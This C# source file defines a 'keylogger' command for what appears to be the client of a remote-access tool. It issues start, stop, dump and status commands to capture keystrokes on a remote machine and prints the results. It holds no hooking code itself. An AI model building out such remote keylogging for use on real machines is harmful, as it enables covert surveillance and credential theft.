using System;
using System.Collections.Generic;
using Client.Commands.Core;

namespace Client.Commands
{
    internal class KeyLogger : IClientCommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the server's keystokes. You can see it's status, dump logged keys, start and stop it";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "start",
            "stop",
            "dump",
            "status"
        };


        public void Process(List<string> args)
        {
            if (args.Count != 1)
            {
                return;
            }

            if (args[0] == "status" || args[0] == "dump")
            {
                Console.WriteLine(ClientCommandsManager.networkManager.ReadLine());
            }
        }
    }
}
